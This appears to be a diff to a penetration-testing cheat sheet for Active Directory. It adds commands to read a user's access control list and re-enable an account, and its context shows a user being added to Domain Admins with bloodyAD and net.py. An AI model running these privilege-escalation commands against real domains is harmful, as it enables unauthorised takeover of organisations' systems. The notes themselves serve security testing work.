@@ -37,6 +37,10 @@ cd ~/bloodhound
 ```bash
 bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get writable --otype USER --detail
 ```
+### Get juicy user inbound object control
+```bash
+python dacledit.py "$domain/$domainuser:$domainuserpwd" -dc-ip $dcip -action read -target "john.doe"
+```
 
 ### Enum group membership
 ```bash
@@ -53,4 +57,8 @@ bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" get object "
 ```bash
 bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" add groupMember "Domain Admins" "john.doe"
 python3 net.py "$domain/$domainuser:$domainuserpwd@$dcip" group -name "Domain Admins" -add "john.doe"
+```
+### Enable a user account
+```bash
+bloodyAD --host $dcip -d $domain -u $domainuser -p "$domainuserpwd" set uac "target_user" 512
 ```
